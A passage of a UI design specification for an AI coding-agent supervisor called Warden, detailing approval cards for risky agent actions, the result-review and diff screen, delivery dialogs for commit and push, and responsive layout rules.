### 12.1 Inline ApprovalCard: anatomy

The card is the approval prompt. It appears inside the `TaskCard` of the task that raised it as soon as `approval.requested` arrives, expanded, and stays until `approval.resolved` (it cannot be collapsed, dismissed by a click outside, or hidden by scrolling rules: if it is off screen, the `RunStatusStrip` and the `PendingApprovalBadge` point to it).

```
+-------------------------------------------------------------------------------------+
| (?) Package install needs approval                               [R4]   10:07:31  |  header 24
|                                                                                     |
| What   +---------------------------------------------------------------------------+ |
|        | npm install                                                               | |  code block
|        +---------------------------------------------------------------------------+ |
|        in the worktree root · adds egress to registry.npmjs.org:443 (+4 hosts ▸)    |
| Who    coder@1.0.0 · task implement · step 9 · Run 1                                |
| Why    Egress to registry.npmjs.org:443 is not in the task allowlist.               |
|        rule user.package-install · risk R4 (install profile)                        |
| Scope  [ 1 Once ][ 2 Task ][ 3 Session ][*4 Workspace ]                              |  segmented 32
|        Same pattern in ts-express-api from now on; stored in ~/.warden. Revocable.   |  help
|                                                                                     |
| Explain  E    CLI ⧉                                   [Reject  R]  [Approve  A]     |  actions 32
+-------------------------------------------------------------------------------------+
```

| Part | Spec | Source |
|---|---|---|
| Container | Border 1 px `color-effect-approval`, `radius-md`, background `color-surface-2`, padding `space-3`; `role="group"` labeled by the title; announced politely on arrival with "Press G then A to review"; focus never moves (ID-15, B05) | `approval.requested` |
| Header | Icon 16 `color-effect-approval`; title `text-md` 600 by approval kind (`approval.title.install`, `.command`, `.egress`, `.push`, `.harness`, `.question`); risk chip `mono-sm` 20 high ("R4"); request time `mono-sm` `color-text-muted` (static, from the `approval.requested` envelope `ts`; no ticking counter, B05 §6.4); "Open until {time}" appears here only in the last hour before expiry (`approval.expires`) | `approval.requested` → `risk_class`, `pattern.tool`, `pattern.operation`; kind mapping in §12.2 |
| Labels column | 56 wide, `text-sm` `color-text-muted`: "What", "Who", "Why", "Scope" | static |
| What | Code block `mono-md`, background `color-surface-3`, `radius-sm`, padding `space-2`, horizontal scroll for long argv (never truncated); sub-line `text-sm`: location and side effects; obligation hosts behind a disclosure ("+4 hosts ▸" lists them) | `approval.requested` → `display.what`, `pattern.resource_pattern`; `policy.decision` → `obligations.egress_allow` |
| Who | `text-sm`: agent@version · task key · step · run | `approval.requested` → `display.who`; envelope `actor`, `task_id`; `model.call.start.step` |
| Why | Sentence `text-sm` `color-text`; meta line `mono-sm` `color-text-muted`: "rule <id> · risk <class> (<label>)"; taint line when present: icon `color-untrusted` + `approval.taint.notice` ("Suggested by untrusted content: README.md") | `approval.requested` → `display.why`, `reason`, `rule_ids[]`, `risk_class`; `display.taint_sources[]` (ASM) |
| Scope | Segmented control, 4 equal segments, height 32, labels "1 Once", "2 Task", "3 Session", "4 Workspace" (digit in `mono-sm`); default selection Once, except approvals from rule `user.package-install`, which preselect Workspace when it is in `scopes_allowed` (ID-08; the demo's `apr_9` therefore opens on Workspace and the user presses only `A`); the consequence text of the selected scope is always visible; segments not in `scopes_allowed` are disabled (`aria-disabled`, tooltip `approval.scope.disabled.scope_max` "Not allowed for this action. Maximum: task"); for R5 only Once is enabled (`approval.scope.locked.r5`) | `approval.requested` → `scope_max`, `scopes_allowed[]` |
| Scope help | One line `text-sm` `color-text-muted` for the selected scope: `approval.scope.help.once`, `.task`, `.session`, `.workspace` (the workspace text names the workspace and says the grant is stored in `~/.warden`, not in the repository, and is revocable) | selected scope; workspace name |
| Explain | Link `text-sm` `color-accent` "Explain" + key hint `E`; opens the `ExplainDrawer` (§12.3) | `policy.explain` |
| CLI | Icon button copying `warden approve apr_9 --scope <selected>` (updates with the selection); tooltip shows the command | `approval_id` |
| Actions | "Reject" secondary (`R`), "Approve" primary (`A`), 32 high, key hints inside the labels; Approve label includes the scope when not Once ("Approve · workspace"); Reject returns the task to `running` and the model receives `{ok: false, error: {code: "approval_rejected"}}` (ID-10) | `approval.resolve {approval_id, decision, scope}` |

Height: about 330 at `w1440` with a one-line What block. The card never exceeds the card column; long commands scroll horizontally inside the code block.

### 12.2 Variants

| Kind | Trigger | Title (key) | What | Why (example) | Scope |
|---|---|---|---|---|---|
| Install (R4) | `proc.exec` with `command_profile: install` | "Package install needs approval" (`approval.title.install`) | `npm install` + egress hosts from obligations | "Egress to registry.npmjs.org:443 is not in the task allowlist." · `user.package-install` · R4 | 1 to 4 (max workspace); Workspace preselected (ID-08) |
| Command (R3) | `proc.exec` with `command_profile: ""` | "Command outside profiles needs approval" (`approval.title.command`) | exact argv, cwd | "Command is outside the approved profiles." · `user.other-commands` · R3 | 1, 2 (max task) |
| Egress (R4) | proxy CONNECT to a host outside the task allowlist | "New network destination needs approval" (`approval.title.egress`) | `CONNECT setup.example.net:443` · "requested by curl (call_…)" + `approval.egress.hold` ("The connection waits up to 120 s for your answer; after that it is refused, and approving still allows later connections.") | `user.egress-other` · R4 | 1 to 3 (max session) |
| Push (R5) | `workflow.deliver {action: push}` | "Push needs approval" (`approval.title.push`) | `git push origin warden/01jaxr8q7m2v9ktc3f6yh5n0pb` · "commit 3f9c2a1 · 4 files +86 −3" | "Push changes a remote repository." · `user.git-push` · R5 | Once only (`approval.scope.locked.r5`) |
| Harness (R4) | start of a `tolerated` harness (Codex) | "Harness start needs approval" (`approval.title.harness`) | "Start codex (vendor terms: tolerated)" + `harness.terms.tolerated` excerpt | `user.harness-tolerated` · R4 | 1 to 3 (max session) |
| Question | `approval.request` tool (R0 host, `approval.requested.kind: question`, ID-05), task `waiting_for_input` | "The agent asks a question" (`approval.title.question`) | the question text, labeled `approval.question.label` ("Written by the model") | – | none; answer textarea (≤ 4,000 chars) + "Answer" / "Cancel run"; Answer calls `approval.resolve {approval_id, decision: approve, answer}` (ID-05); the answer returns to the model as untrusted-tagged user input in `tool.exec.end` |

Who line for Push: "Delivery of Run 1 · requested by you". Taint line appears on any variant whose `display.taint_sources` is non-empty (typical in `injection-lab`).

### 12.3 Context panel view of an approval

Selecting the card (or arriving by `/approvals/:id` or `G` then `A`) shows in the panel, in order:

1. The same card content at panel width (What code block wider; actions repeated in a sticky 64 px footer; both sets act on the same approval, and resolving in either updates both).
2. **Decision**: `policy.decision` → `decision_id`, `effect: approval_required`, `reason`, `matched_rules` with layers, `obligations`; `approval.requested` → `expires_at` shown as "Open until 10:07 tomorrow (expires after 24 h; the task then fails)" (`approval.expires`; the panel always shows it, the card only in the last hour).
3. **Explain** (inline, also openable as `ExplainDrawer` with `E`): result of `policy.explain {tool, operation, resource, session_id}` as a table Layer · Rule · Effect, followed by the combination sentence ("A matching rule requires approval and no grant covers this action.").
4. **Grant preview**: what the selected scope will cover, as the canonical pattern (`pattern{tool, operation, resource_pattern}`) and its lifetime (once: this call; task: until implement ends; session: until the session closes; workspace: until revoked).
5. **CLI**: `warden approve apr_9 --scope workspace`, `warden reject apr_9`.

### 12.4 States

| State | Card presentation | Trigger |
|---|---|---|
| Pending | Full card; TaskCard border `color-effect-approval`; gutter icon pulses | `approval.requested` |
| Submitting | Buttons disabled; chosen button shows spinner and "Approving…" / "Rejecting…"; scope control disabled; no timeline state change until the event (B05) | after `approval.resolve` is sent |
| Approved | Collapses (height animation `motion-base`, none with reduced motion) to a 28 px status row inside the task: check `color-effect-allow` "Approved · workspace · by you · 10:07:31" + "Revoke" link for `session` and `workspace` scopes; the related `ToolCallRow` shows "approved · workspace" | `approval.resolved {decision: approve}` |
| Rejected | Status row: cross `color-effect-deny` "Rejected by you · 10:07:31"; the task returns to `running` (ID-10) | `approval.resolved {decision: reject}` |
| Expired | Status row `color-state-failed`: "Expired after 24 h · task failed (approval_expired)" | `approval.resolved {decision: expire}` |
| Cancelled | Status row `color-state-cancelled`: "Cancelled with the task" | `approval.resolved {decision: cancel}` |
| Resolved elsewhere | Status row names the approver and client: "Approved in CLI by local:robert · workspace" | `approval.resolved` not preceded by a local call |
| Revoked | Status row appends "· revoked 10:31:02" | `approval.revoked` |
| Error: scope not allowed | Card stays pending; inline error under Scope: `error.policy_denied` | `approval.resolve` error -32004 |
| Error: already resolved | Card refreshes to the resolved state with `error.invalid_state` note | -32003 |
| Disconnected | Buttons disabled with `error.daemon_disconnected`; card stays | connection lost |

Revoke (status row link) needs no confirmation because it narrows permissions (B05 §6.6): it calls `approval.revoke {approval_id}`, and on `approval.revoked` the row shows "Revoked · 10:31:02. The next matching request asks again." (`approval.revoked`); a call already running is not interrupted.

### 12.5 OS notification

| Field | Content |
|---|---|
| Title (≤ 50 chars) | "Approval needed · ts-express-api" (`notify.approval.title`) |
| Body (≤ 120 chars) | "coder (implement) wants to run npm install · R4 · user.package-install" (`notify.approval.body`, built from `display.what`, `display.who`, `risk_class`, `rule_ids[0]`); for `confidential` workspaces the recommended body is "Approval needed in go-cli-tool" without the command (B01 §12) |
| Actions | none |
| Group | one thread per session (`session_id`) |
| Click | focus window, navigate to `/sessions/:sid/runs/:rid/approvals/apr_9`, focus the Scope control |
| Sent when | window unfocused, or focused but another session or screen is shown; never for the session on screen with the window focused |
| Withdrawn | on `approval.resolved` (where the OS supports withdrawal) |

Gate notifications follow the same pattern with `notify.gate_plan` ("Plan ready for review · ts-express-api") and `notify.gate_final` ("Result ready for review · ts-express-api · 43 passed").

### 12.6 PendingApprovalBadge

`SessionHeader`, left of the cost (§10.2). Segmented pill 28 high, `radius-lg`, padding `space-2` per segment, `text-sm` 600: segment 1 "1 pending" (inline approvals; background `color-effect-approval`, text `color-text-inverse`), segment 2 "G1 open" or "G2 open" (open gate; outlined `color-effect-approval`), segment 3 "1 needs input" (tasks in `waiting_for_input`; outlined `color-state-waiting`). Segments with a zero count are not rendered; the badge slot keeps its width while the session has an active run, so nothing shifts (B05 §4.1). Tooltip `approval.jump` ("Go to pending approval (G then A)"). Click or `Enter` does exactly what `G` then `A` does: focus the oldest pending item in `seq` order, cycling on repeat (B05 §6.3). On SCR-1 each `WorkspaceRow` with pending items shows the same pill in compact form (24 high) after the name. The window title is prefixed with the approval count ("(1) ts-express-api · Warden") while it is positive. Sources: session subscription (`approval.requested` minus `approval.resolved` by `approval_id`; `workflow.gate.presented` minus `workflow.gate.resolved` by `gate_id`; `task.state` for `waiting_for_input`); initial state from `approval.list {session_id, status: pending}` and `workflow.get`; SCR-1 markers from the global subscription (`event.subscribe {session_id: "*", types: [approval.*, workflow.gate.*]}`).

## 13. SCR-5 Result review, G2 (high fidelity)

### 13.1 Review layout and grid

On `workflow.gate.presented {gate_key: gate-final}` the session route switches to the review layout (`/gate/final`): the timeline column narrows to a compact column and the context panel becomes the review panel. The compact timeline shows one 32 px line per entry (icon, title, one key figure) and keeps `J`/`K` navigation; selecting a compact entry opens its detail in an `ExplainDrawer` over the review panel instead of leaving the review.

| Breakpoint | Compact timeline | Review panel | File list | Diff pane | Diff view default |
|---|---|---|---|---|---|
| `w1920` (1920) | 360 | 1503 | 280 | 1223 | split |
| `w1440` (1440) | 320 | 1063 | 220 | 843 | unified (split allowed) |
| `w1280` (1280) | hidden; "Timeline" button in the review header opens it as a 360 left drawer | 1224 | 220 | 1004 | unified (split allowed) |
| `w1024` (1024) | hidden; same drawer | 968 | replaced by a file select (full width, 36) above the diff | 968 | unified (split allowed) |

Split view is offered when the diff pane is at least 800 wide and is the default at 1100 and above; below 800 the toggle is disabled with the tooltip `diff.split_unavailable`. The user's last choice is remembered per viewer (`localStorage`, try/catch). Leaving the review ("Back to timeline" in the header or `Esc` when no drawer is open) returns to the normal layout with the G2 entry selected; the gate stays open.

### 13.2 Region map with canonical content (1440)

```
+----+----------------------+---------------------------------------------------------------------------------+
| WS | ● Request            | Result review · Gate G2                                   [Waiting for you]     |  header 72
| ST | · Branch created     | Run 1 · code-diff v2 (after repair-1) · test-report v2          [Back to timeline] |
| DR | ✓ plan    $0.00      +---------------------------------------------------------------------------------+
|    | ✓ Gate G1 approved   | +-------------------------+ +-------------------------+ +---------------------+ |  summary 96
|    | ✓ implement  $0.00   | | Tests                   | | Cost                    | | Audit chain         | |
|    | ✗ verify  42/1       | | 43 passed               | | $0.00                   | | Verified            | |
|    | ✓ repair-1           | | 0 failed · 0 skipped    | | 305.1k in · 14.5k out   | | 1,284 events        | |
|    | ✓ verify-2  43/0     | | node-test · 6.8 s       | | local; infra not tracked| | strict ok · signed  | |
|    | ◉ Gate G2  waiting   | +-------------------------+ +-------------------------+ +---------------------+ |
|    |                      | [Changes (4)] [Tests (43)] [Cost]        Group [File|Task]  View [Unified|Split] |  tabs 40
|    |                      | +------------------+----------------------------------------------------------+ |
|    |                      | | M src/routes/    | src/routes/users.ts                        +18 −1         | |  file hdr 36
|    |                      | |   users.ts +18 −1| @@ -1,8 +1,8 @@                     implement · step 12  | |  hunk hdr 28
|    |                      | | M src/services/  |   import { Router } from "express";                      | |
|    |                      | |   userService.ts | - import { listUsers } from "../services/userService";   | |
|    |                      | |   +9 −0          | + import { listUsers, findUserById } from "../servi…";   | |
|    |                      | | A test/routes/   | @@ -18,3 +18,20 @@          implement · step 12 · repair-1 · step 4 | |
|    |                      | |   users.test.ts  | + usersRouter.get("/:id", async (req, res, next) => {   | |
|    |                      | |   +41 −0         | +   try {                                                | |
|    |                      | | M test/services/ | +     const user = await findUserById(req.params.id);    | |
|    |                      | |   userService…   | +     if (!user) {                                       | |
|    |                      | |   +18 −2         | +       return next(new NotFoundError("user"));          | |
|    |                      | |                  | +     }                                                  | |
|    |                      | |                  | +     res.json(user);                                    | |
|    |                      | +------------------+----------------------------------------------------------+ |
|    |                      | Nothing has been applied to your repository yet.                                |  GateBar + DeliveryBar 64
|    |                      | [Accept result A] [Discard result R] [Iterate] [Export patch] [Apply to branch…] [Commit…] [Push…] |
+----+----------------------+---------------------------------------------------------------------------------+
```

### 13.3 Header and summary cards

| Element | Spec | Source |
|---|---|---|
| Header | Title `text-xl` 600 "Result review · Gate G2" (`result.title`); badge "Waiting for you"; subtitle with artifact versions (`mono-sm` ids copyable); "Back to timeline" link; at `w1280` and below also a "Timeline" button | `workflow.gate.presented` → `artifacts[]`; `artifact.get` → `version`, `supersedes` |
| Summary cards | Three cards in a row, equal width, gap `space-3`, height 96, `color-surface-1`, `radius-md`, padding `space-3`; label `text-sm` `color-text-muted`; value `text-xl` 600; two sub-lines `text-sm`; each card is a button that opens its tab (Tests, Cost) or SCR-7 Audit (chain) | below |
| Tests card | Value "43 passed" in `color-state-succeeded`; "0 failed · 0 skipped"; "node-test · 6.8 s"; footer link "Earlier: verify failed 42/1, repaired" when a repair ran | `test-report` v2 → `passed`, `failed`, `skipped`, `profile`, `duration_ms`; history from `test-report` v1 |
| Cost card | Value "$0.00"; "305.1k in · 14.5k out"; note `cost.local_note` ("local; infrastructure cost not tracked"); harness runs show "12 premium requests" as value and `cost.quota_note` | Σ `model.call.end.usage` for the run (`input_tokens`, `output_tokens`, `estimated_cost.amount`, `quota.units`) |
| Chain card | Value from `StatusBadge chain`: "Verified" `color-state-succeeded`, "Verifying…", "Failed" `color-state-failed`; "1,284 events"; "strict ok · signed" (checkpoint signature present) | `audit.verify {session_id, strict: true}` → `ok`, `events`, `strict_ok`, `checkpoint_ok` |

At `w1024` the cards shrink to height 72 (value `text-lg`, one sub-line).

### 13.4 Changes tab: file list and DiffViewer

Toolbar (40): "4 files changed · +86 −3" (`text-sm`); "Group" segmented (File, Task; CF-37); "View" segmented (Unified, Split); "Provenance" toggle (on by default). Source: `code-diff` metadata → `files[]`, `stats`.

File list (220 to 280 wide, scrolls): rows 44 (two lines): status letter `mono-sm` (A added `color-diff-add` text, M modified, D deleted `color-diff-del` text); path `mono-sm`, directory on line 1 and basename on line 2 when long, middle ellipsis; "+18 −1" `mono-sm`; small task tags `text-xs` ("implement", "repair-1") for the tasks that touched the file. Selected row `color-surface-2` with a 2 px `color-accent` left bar. Group by Task shows headers "implement · 4 files" and "repair-1 · 1 file" (a file touched by both appears under both, with the hunks of that task highlighted). `↑`/`↓` move within the list when it has focus (B05).

Canonical file list:

| Status | Path | Stats | Tasks |
|---|---|---|---|
| M | src/routes/users.ts | +18 −1 | implement, repair-1 |
| M | src/services/userService.ts | +9 −0 | implement |
| A | test/routes/users.test.ts | +41 −0 | implement |
| M | test/services/userService.test.ts | +18 −2 | implement |

DiffViewer:

| Part | Spec | Source |
|---|---|---|
| File header | Sticky 36: path `mono-md`, stats, "Copy path"; background `color-surface-1` | `code-diff` → `files[]` |
| Hunk header | 28: `@@ -18,3 +18,20 @@` `mono-sm` `color-text-muted`; right-aligned provenance chips `text-xs` (`radius-sm`, `color-surface-3`): the primary attribution ("implement · step 12 · fs.patch") followed by one chip per extra contributor ("repair-1 · step 4"); `attribution: task` (no single call identified) shows the task only, marked "task-level"; each chip is a link | `code-diff` → `files[].hunks[].provenance{task_key, task_id, execution_id, step, call_id, tool, model_call_id, attribution, contributors[]}` (ID-11) |
| Lines | `mono-sm`, line height 20; gutters: old and new line numbers 44 each (unified), one per side (split); added lines background `color-diff-add`, deleted `color-diff-del`; long lines wrap off by default with horizontal scroll per file | `artifact.read {id, file}` |
| Contributor tint | Hunks with more than one contributor get a 3 px `color-accent` bar along the hunk header's left edge; hovering a chip shows "repair-1 · step 4 · fs.patch · call_58 · mc_…" | `provenance.contributors[]` (ID-11; attribution is per hunk, not per line) |
| Provenance link | Click on a chip: the compact timeline (or its drawer) scrolls to the `ToolCallRow` of that call and selects it; the review stays open; `Esc` returns focus to the hunk | `call_id` → timeline entry |
| Untrusted note | none: the diff is the agent's own output under review, not an observation; the header states "Written by coder in this run" | – |

Loading: skeleton lines per file while `artifact.read` streams; files load lazily as they scroll into view.

### 13.5 Tests tab

`TestReport` for the latest verification, with history.

```
verify-2 · node-test · npm test · exit 0 · 43 passed · 0 failed · 0 skipped · 6.8 s
node-build · npx tsc --noEmit · exit 0 · 3.1 s

History
  verify     · 42 passed · 1 failed · 6.9 s   → repair-1
      ✗ GET /users/:id returns 404 for unknown id
        expected 404, received 200            test/routes/users.test.ts
      Analysis (verifier, local/qwen-coder-32b): The route returns 200 with an empty body when
      findUserById returns undefined; add a 404 branch in src/routes/users.ts.
  verify-2   · 43 passed · 0 failed · 6.8 s · analysis generated without a model call (ID-09)
```

Source: `test-report` artifacts (`profile`, `exit_code`, `passed`, `failed`, `skipped`, `failures[{name, message}]`, `duration_ms`, `analysis`). The analysis is labeled with the model that wrote it (from the verify task's `routing.decision`). Failure messages are `mono-sm`, truncated at 20 lines with "Show all".

### 13.6 Cost tab

`CostPanel` full table (rows 32, `mono-sm` numbers right-aligned):

| Task | Model | Tier | Input | Output | Quota | Cost |
|---|---|---|---|---|---|---|
| plan | local/qwen-coder-32b | T0 | 18.4k | 1.2k | – | $0.00 |
| implement | local/qwen-coder-32b | T0 | 212.9k | 9.8k | – | $0.00 |
| verify | local/qwen-coder-32b | T0 | 9.1k | 0.6k | – | $0.00 |
| repair-1 | local/qwen-coder-32b | T0 | 64.7k | 2.9k | – | $0.00 |
| verify-2 | no model call (tests passed, ID-09) | – | 0 | 0 | – | $0.00 |
| **Total** | | | **305.1k** | **14.5k** | – | **$0.00** |

Footer lines: `cost.local_note`; session spend "$0.00 of $5.00" and today "$0.00 of $15.00". Token figures are illustrative. Source: `model.call.end.usage` grouped by `task_id`; model and tier from `model.call.start`; limits from `workflow.get` → `budget` (ID-13). For a harness run the Quota column shows premium requests from `usage.quota.units` and `harness.session.end.quota`, and the Cost cell shows "–" with `cost.quota_note`.

### 13.7 GateBar with DeliveryBar (G2)

In the review layout the G2 `GateBar` (B04 C-13, hosting the `DeliveryBar` C-26) is sticky at the bottom of the review panel, because the compact timeline (320 to 360) cannot hold the delivery actions; its focus context is the same as in B05 §2.6 (GateBar plus the G2 gate entry). Height 64 (it grows to fit a push `ApprovalCard`, up to 360, and the review body above shrinks), top border, 3 px `color-effect-approval` top stripe while the gate is open, `color-surface-1`, padding `space-4`. Left: status text `text-sm`. Right: buttons 32 high, gap `space-2`; delivery buttons are a `toolbar` reached with `Tab` and arrow keys and have no single-key shortcuts (B05 §2.6).

Lifecycle (ID-01, ID-02): the gate decides the run, delivery happens after it. "Accept result" approves G2, which ends the run at once: `task.state gate-final →succeeded`, `artifact.created {type: final-result}`, `chain.checkpoint {trigger: workflow_end}`, `workflow.end {status: succeeded}`. "Discard result" rejects G2 and ends the run `cancelled`, reason `rejected`; nothing is delivered and the verified evidence stays readable. Delivery actions are valid only on a `succeeded` run (plus Export patch on a `failed(verification)` run, CF-24); a delivery pressed while G2 is still open first sends `workflow.resolveGate {approve}`, waits for `workflow.gate.resolved`, then sends `workflow.deliver`. Every delivery is an ActionRequest with `actor.kind: user` and produces `policy.decision` → `tool.exec.start {executor: host}` → `tool.exec.end` → `workflow.delivered {run_id, action, commit, branch, remote, patch_path, approval_id}`; the status text and the timeline delivery lines are driven by `workflow.delivered`.

| Control | Style, key | Enabled when | Action |
|---|---|---|---|
| Accept result | primary while the gate is open, `A` | gate open | `workflow.resolveGate {decision: approve}`; run `succeeded`; delivery stays available |
| Discard result | secondary, `R` | gate open | inline confirmation in the bar ("Discard this result? The run ends and nothing is delivered.", optional comment; `Enter` confirms, `Esc` keeps reviewing) → `workflow.resolveGate {decision: reject, comment}` → run `cancelled(rejected)`; the review becomes read-only with ST-5 treatment |
| Iterate | secondary | gate open or run succeeded | accepts the result if the gate is still open (`workflow.resolveGate {decision: approve, comment: "iterate"}`, run `succeeded`), then returns to the normal layout with the composer focused and a context chip "Builds on run {run_id}"; the next `session.request` starts a new run on the same session branch |
| Export patch | secondary | run succeeded, gate open (accepts first) or run `failed(verification)` | `workflow.deliver {action: export_patch}` (host tool `git.export_patch`, R1, `platform.user-delivery`) → `patch_path`; status "Patch saved to ~/.warden/exports/…" with "Reveal in folder" |
| Apply to branch… | secondary | run succeeded or gate open (accepts first) | dialog §13.8 → `workflow.deliver {action: apply_branch, branch_name}` (host tool `git.apply_branch`, R1, `platform.user-delivery`): publishes the session branch into the user's repository without squashing |
| Commit… | secondary; primary after acceptance | run succeeded or gate open (accepts first); no commit yet | dialog §13.8 → `workflow.deliver {action: commit, message, branch_name}` (`git.commit`, `user.git-commit-session-branch`): squashes the session diff into one commit on the session branch and publishes the branch into the user's repository, default name `warden/<ulid>`, editable (ID-03) |
| Push… | secondary | a commit or an applied branch exists in this session (ID-03); disabled tooltip `delivery.push_needs_approval` plus "Commit or apply first." | dialog §13.8 (remote from `workflow.get` → `repository.remotes[]`, ID-13; branch) → `workflow.deliver {action: push, remote, branch_name}` → `status: approval_pending`, `approval_id` → R5 Push `ApprovalCard` (§12.2) opens in the bar above the buttons, announced but not focused; after focusing it (`G` then `A` or `Tab`), `A` (scope Once only) or `R`. Without a prior commit or apply the daemon answers `invalid_state` (-32003) |

Status text by state:

| State | Left text |
|---|---|
| Gate open | "Nothing has been applied to your repository yet." (`gate.g2.subtitle`) |
| Accepted | "Result accepted by you · 10:21:30. Run succeeded. Choose a delivery action or iterate." |
| Discarded | "Result discarded by you · 10:21:30. Nothing was delivered." (`color-state-cancelled`) |
| Sending | spinner and "Committing…", "Applying…", "Pushing…" |
| Committed | "Committed 3f9c2a1 and published branch warden/01jaxr8q… in your repository." (`delivery.done.commit`); the Commit button becomes "Committed" (disabled, check icon) |
| Applied | "Branch warden/01jaxr8q7m2v9ktc3f6yh5n0pb published in your repository at 3f9c2a1." (`delivery.done.apply_branch`) |
| Push pending | "Push waiting for your approval (apr_14)"; the card is open above the buttons |
| Push rejected | cross `color-effect-deny` "Push rejected by you. The commit stays on the published branch." (`delivery.push_rejected`); Push… is enabled again (a new attempt creates a new approval) |
| Pushed | "Pushed warden/01jaxr8q… to origin." (`delivery.done.push`), from `workflow.delivered {action: push}` |
| Delivery error | `color-state-failed` text from the error (`error.rpc.<code>`), the action button re-enabled |

At `w1024` the bar shows Accept result (Commit… after acceptance), Push… and a "More" menu with Apply to branch…, Commit…, Export patch, Iterate and Discard result. The "Cancel run" control stays in the `SessionHeader` while the gate is open (§10.2); after acceptance there is no active run to cancel.

### 13.8 Confirmation dialogs

Modal dialogs for host effects (B05 IR-6), width 480, `radius-lg`, `elevation-3`, scrim; focus on the primary button; `Esc` cancels; `Enter` confirms when focus is not in a multi-line field. Final wording: B07 §11 (`confirm.commit`, `confirm.apply_branch`, `confirm.push`). While G2 is still open, confirm buttons read "Accept and …" (ID-01); after acceptance they read the plain verb.

**Commit**:

```
Commit and publish the branch?
Squashes 4 files (+86 −3) into one commit on the session branch and publishes it
in ~/code/ts-express-api. Your checkout and working files are not changed.
Branch name     [ warden/01jaxr8q7m2v9ktc3f6yh5n0pb ]
Commit message
[ Add GET /users/:id with 404 handling and tests                              ]
Author: warden ses_01JAXR8Q…
                                                  [Cancel]  [Accept and commit]
```

Message prefilled from the run summary (B05 §7.5), first line trimmed to 72 characters; required; ≤ 2,000 characters. Branch name default `warden/<ulid>` (ID-03), validated with git ref rules (no spaces, no `..`, no leading `-`, not `main`, `master` or `release/*`; `confirm.apply_branch.exists` when it exists). Under ST-6 the line `deliver.chain_failed_note` is added.

**Apply to branch**:

```
Publish the session branch in your repository?
Branch name  [ warden/01jaxr8q7m2v9ktc3f6yh5n0pb ]
Publishes the session branch as is (checkpoint commits, not squashed) in
~/code/ts-express-api. Your checkout and working files are not changed.
Git hooks are disabled for this step.
                                                  [Cancel]  [Accept and apply]
```

Same branch-name validation as Commit.

**Push**:

```
Push to a remote?
Remote  [ origin ▾ ]     Branch  [ warden/01jaxr8q7m2v9ktc3f6yh5n0pb ▾ ]
Pushing changes a remote repository. The next step asks for approval, once.
                                                  [Cancel]  [Continue to approval]
```

Remotes come from `workflow.get` → `repository.remotes[]` (ID-13); the branch list contains only branches published by this session. The dialog collects the target only; the effect is authorized by the R5 `ApprovalCard` that follows (scope fixed to Once). Rejecting that card is the demo's ending (WRD-16 §3 step 6).

### 13.9 States of the review panel

| State | Presentation |
|---|---|
| Loading | Header and summary cards with skeleton values; diff skeleton; GateBar buttons disabled until `artifact.read` of the diff completes |
| Chain verifying | Chain card "Verifying…"; delivery allowed (chain status is evidence, not a lock) |
| Chain failed (ST-6) | Red banner above the header (session-scoped, §9.6); chain card "Failed" with link to violations; confirmations carry `deliver.chain_failed_note` |
| Diff too large | Files over 2 MB of diff or 5,000 lines show "Large diff: 6,210 lines" with "Load file" (explicit) instead of auto-render |
| Gate resolved elsewhere | Buttons update from `workflow.gate.resolved` and delivery events; status line names the approver ("Resolved from the CLI by local:robert") |
| Cancelled or discarded at G2 | Review becomes read-only with ST-5 treatment (run `cancelled`, reason `cancelled` or `rejected`); Iterate stays; no delivery (ID-02) |
| Error | `artifact.read` error: inline error in the diff pane with Retry and `warden diff <session>` |

### 13.10 Variant: verification failed after repair (CF-24)

When `verify-2` ends `failed(verification)`, no G2 is presented and the run ends `failed`. The route `/sessions/:sid/runs/:rid/result` shows the same review layout, read-only:

```
+-------------------------------------------------------------------------------------------------+
| Result · verification failed                                          [Failed · verification]  |
| Run 1 · code-diff v2 (after repair-1) · test-report v2                                          |
| [!] Verification failed after 1 repair round. This result cannot be applied, committed or     |
|     pushed. (result.failed.body)                                                                |
+-------------------------------------------------------------------------------------------------+
| [Tests 42 passed · 1 failed] [Cost $0.00]                          [Audit chain Verified]      |
| Tabs: Changes (4) | Tests (43) ← selected by default | Cost                                     |
|   verify-2 · node-test · exit 1 · 42 passed · 1 failed · 6.7 s                                  |
|   ✗ GET /users/:id returns 404 for unknown id                                                   |
|     expected 404, received 200                              test/routes/users.test.ts           |
|   Analysis (verifier, local/qwen-coder-32b): …                                                  |
+-------------------------------------------------------------------------------------------------+
| Read-only result.  [Export patch] [Iterate]   [Apply to branch…] [Commit…] [Push…] (disabled)  |
+-------------------------------------------------------------------------------------------------+
```

Differences from the G2 review: header title `result.failed.title` and badge `color-state-failed`; an in-panel `Banner` (`color-state-failed`) with `result.failed.body`; the Tests card shows the failure count in `color-state-failed` and the Tests tab opens by default; the GateBar is replaced by a result bar in which only Export patch (`workflow.deliver {action: export_patch}`, valid on a `failed(verification)` run, ID-02) and Iterate (focuses the composer) are enabled; Apply to branch, Commit and Push are shown `aria-disabled` with the description `delivery.unavailable_failed` ("Not available: verification did not pass.", B05 §7.5), and there is no Accept or Reject and no `A`/`R` binding because no gate exists. Source: `task.state` (`verify-2`, `to: failed`, `reason: verification`), `workflow.end {status: failed}`, `artifact.list {run_id}`.

Hunk provenance follows ID-11: `code-diff` metadata `files[].hunks[].provenance{…, attribution: call|task, contributors[]}`, persisted by the runtime from the per-call write log so it survives a daemon restart. Attribution is per hunk; the UI does not claim line-level authorship.

## 14. Responsive summary (all screens)

| Screen | `w1920` | `w1440` | `w1280` | `w1024` |
|---|---|---|---|---|
| Shell | NavRail 56, TopBar 48 | same | same | same; breadcrumb keeps last two segments |
| SCR-1 | table max 1200 centered | table 1200 | table fluid | table fluid; providers column merges into the name cell's second line |
| SCR-2 | 640 + panel | 560 + panel | 480 + panel | timeline + 480 drawer |
| SCR-3 | inline PlanCard 560; GateBar spans the timeline column | PlanCard 480 | PlanCard 400; compact GateBar buttons, Explain as icon | PlanCard ≤ 680; compact GateBar, subtitle hidden |
| SCR-4 | inline card 560 wide + panel | 480 + panel | 400 + panel | inline card ≤ 680; drawer only when opened |
| SCR-5 | compact timeline 360, split diff | 320, unified default | timeline drawer, unified default | timeline drawer, file select, "More" menu |
| SCR-6 | cards and table max 1200 | same | table scrolls horizontally from the Priors column | cards stack actions under the text |
| SCR-7 | EventLog JSON drawer 480 | same | same | JSON drawer 480 overlays the log |
| ST-1 | 4 path cards | 4 | 4 | 2 × 2 |

Nothing in any breakpoint hides a decision control: approval actions, gate actions and Cancel are visible at every width.

## 15. Microcopy key registry

